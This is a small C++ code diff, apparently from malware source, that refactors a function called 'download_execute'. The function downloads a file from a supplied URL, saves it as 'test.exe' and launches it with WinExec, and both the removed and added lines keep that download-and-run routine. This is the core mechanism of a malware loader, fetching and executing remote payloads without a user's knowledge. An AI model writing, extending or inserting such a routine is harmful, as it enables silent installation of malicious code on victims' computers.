@@ -7,9 +7,7 @@ namespace absent
 	{
 		bool download_execute(std::string url)
 		{
-			int res = absent::http::downloadFile(url, "test.exe");
-
-			if (res == 0) { return false; }
+			if (absent::http::downloadFile(url, "test.exe") == 0) { return false; }
 			if (!WinExec("test.exe", 1)) { return false; }
 			return true;
 		}
